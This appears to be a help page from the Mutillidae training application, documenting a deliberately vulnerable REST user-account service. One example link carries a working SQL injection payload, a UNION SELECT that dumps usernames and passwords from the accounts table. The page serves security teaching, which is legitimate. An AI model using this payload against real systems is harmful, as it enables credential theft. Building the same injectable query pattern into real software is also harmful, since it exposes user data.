<a href='/mutillidae/index.php' style='cursor:pointer;text-decoration:none;font-weight:bold;'/>Back to Home Page</a>
						<br /><br /><br />
						<div><span style='font-weight:bold;'>Help:</span> This service exposes GET, POST, PUT, DELETE methods. This service is vulnerable to SQL injection in security level 0.</div>
						<br />
						<hr />
						<div><span style='font-weight:bold;'>DEFAULT GET:</span> (without any parameters) will display this help plus a list of accounts in the system.</div>
							<br />
							&nbsp;&nbsp;&nbsp;<span style='font-weight:bold;'>Optional params</span>: None.
						<br /><br />
						<hr />
						<div><span style='font-weight:bold;'>GET:</span> Either displays usernames of all accounts or the username and signature of one account.
							<br /><br />
							&nbsp;&nbsp;&nbsp;<span style='font-weight:bold;'>Optional params</span>: username AS URL parameter. If username is &quot;*&quot; then all accounts are returned.<br />
							<br />
							<span style='font-weight:bold;'>&nbsp;&nbsp;&nbsp;Example(s):</span><br /><br />
								&nbsp;&nbsp;&nbsp;Get a particular user: <a href='/mutillidae/webservices/rest/ws-user-account.php?username=adrian'>/mutillidae/webservices/rest/ws-user-account.php?username=adrian</a><br />
								&nbsp;&nbsp;&nbsp;Get all users: <a href='/mutillidae/webservices/rest/ws-user-account.php?username=*'>/mutillidae/webservices/rest/ws-user-account.php?username=*</a><br />
							</div>
							<br />
						<div>
						<span style='font-weight:bold;'>&nbsp;&nbsp;&nbsp;Example Exploit(s):</span><br /><br />
							&nbsp;&nbsp;&nbsp;SQL injection: <a href='/mutillidae/webservices/rest/ws-user-account.php?username=%6a%65%72%65%6d%79%27%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%63%6f%6e%63%61%74%28%27%54%68%65%20%70%61%73%73%77%6f%72%64%20%66%6f%72%20%27%2c%75%73%65%72%6e%61%6d%65%2c%27%20%69%73%20%27%2c%20%70%61%73%73%77%6f%72%64%29%2c%6d%79%73%69%67%6e%61%74%75%72%65%20%66%72%6f%6d%20%61%63%63%6f%75%6e%74%73%20%2d%2d%20'>/mutillidae/webservices/rest/ws-user-account.php?username=jeremy'+union+select+concat('The+password+for+',username,'+is+',+password),mysignature+from+accounts+--+<br /></a>
						
						</div>
						<br />
						<hr />
						<div><span style='font-weight:bold;'>POST:</span> Creates new account.
								<br /><br /><span style='font-weight:bold;'>&nbsp;&nbsp;&nbsp;Required params</span>: username, password AS POST parameter.
								<br />
								&nbsp;&nbsp;&nbsp;<span style='font-weight:bold;'>Optional params</span>: signature AS POST parameter.</div>
						<br />
						<hr />
						<div><span style='font-weight:bold;'>PUT:</span> Creates or updates account. <br /><br /><span style='font-weight:bold;'>&nbsp;&nbsp;&nbsp;Required params</span>: username, password AS POST parameter.
								<br />
								&nbsp;&nbsp;&nbsp;<span style='font-weight:bold;'>Optional params</span>: signature AS POST parameter.</div>
						<br />
						<hr />
						<div><span style='font-weight:bold;'>DELETE:</span> Deletes account.
								<br /><br /><span style='font-weight:bold;'>&nbsp;&nbsp;&nbsp;Required params</span>: username, password AS POST parameter.</div>
						&nbsp;&nbsp;&nbsp;<span style='font-weight:bold;'>Optional params</span>: None.
						<br /><br />